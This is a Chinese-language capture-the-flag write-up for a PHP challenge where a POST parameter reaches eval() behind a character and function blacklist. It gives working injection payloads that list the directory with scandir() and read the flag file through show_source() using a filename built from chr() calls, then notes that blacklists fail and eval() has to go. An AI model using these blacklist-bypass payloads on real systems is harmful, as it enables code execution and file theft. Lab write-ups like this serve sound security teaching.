# week3no_way_to_go

## 题目简述

应用把 POST 参数 `N1k0la` 拼入 `eval('echo Welcome' . $str . ';')`。黑名单拦截了常见命令执行函数、引号、空白、方括号和美元符号，但仍允许分号、`scandir()`、`getcwd()`、`chr()` 与 `show_source()`，因此可以先枚举目录，再无引号读取 flag 文件源码。

## 解题过程

提交下面的参数，用分号结束原来的 `echo` 语句并列出当前目录：

```text
N1k0la=;var_dump(scandir(getcwd()))
```

响应中出现：

```text
fllllll4444444g.php
```

由于单、双引号都被过滤，不能直接把文件名写成字符串。`chr()` 未被禁用，可以逐字符构造文件名；`show_source()` 也不包含黑名单中的 `file`：

```php
chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).
chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).
chr(103).chr(46).chr(112).chr(104).chr(112)
```

最终 POST 值为：

```text
N1k0la=;show_source(chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(103).chr(46).chr(112).chr(104).chr(112))
```

返回的高亮源码中包含：

```text
0xGame{u_seem_to_have_found_the_way}
```

## 方法总结

本题的突破点不是继续枚举被禁命令，而是寻找仍可完成“目录发现”和“文件读取”的语言内置函数。黑名单很难覆盖 PHP 的等价能力；从根本上应移除 `eval()`，而不是对用户输入做函数名和字符黑名单。
